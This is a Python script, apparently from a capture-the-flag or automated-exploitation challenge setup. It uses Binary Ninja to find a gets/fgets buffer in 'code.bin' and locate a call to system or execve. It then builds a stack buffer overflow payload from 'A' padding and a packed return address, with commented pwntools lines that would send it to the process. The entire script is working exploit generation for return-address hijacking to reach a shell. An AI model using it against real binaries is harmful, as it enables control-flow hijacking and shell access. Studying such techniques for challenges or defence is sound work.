import binaryninja
import json
import base64
from pwn import p64, process, context, gdb

#context.terminal = ['/c/tools/wsl-terminal/open-wsl.exe','-e']


with open('solution', 'r') as f:
    data = json.load(f)
    solution = base64.b64decode(data['solution_b64'])
    addr = data['addr']

bv = binaryninja.load('code.bin')

sym = bv.get_symbol_at(addr)


def find_win_addr():
    for s in ['system', 'execve']:
        sym = bv.get_symbol_by_raw_name(s)
        if sym is None:
            continue
        func = bv.get_function_at(sym.address)
        assert func is not None
        callers = func.callers
        target = callers[0].start + 5
        print(hex(target))
        return target
    return None


assert sym is not None

if 'gets' in sym.raw_name:
    # fgets and gets both pass buf as first arg
    callers = list(bv.get_callers(addr))
    assert len(callers) == 1, callers
    caller = callers[0]
    hlil = caller.hlil
    assert hlil is not None
    vars = hlil.vars
    assert len(vars) == 1
    v = vars[0]
    assert isinstance(v, binaryninja.Variable)
    offset = v.storage
    target = find_win_addr()
    assert target is not None, "Failed to find win addr"
    if solution.startswith(b'\n'):
        # gets() is called immediately
        solution = b''
    solution += b'A'*(abs(offset)) + p64(target) + b'\n'


with open('solution_fixed', 'w') as f:
    json.dump({'solution_b64': base64.b64encode(solution).decode(), 'addr': addr}, f)

#print(solution)
#r = process('code.bin')
#gdb.attach(r)
#r.send(solution)
#r.interactive()

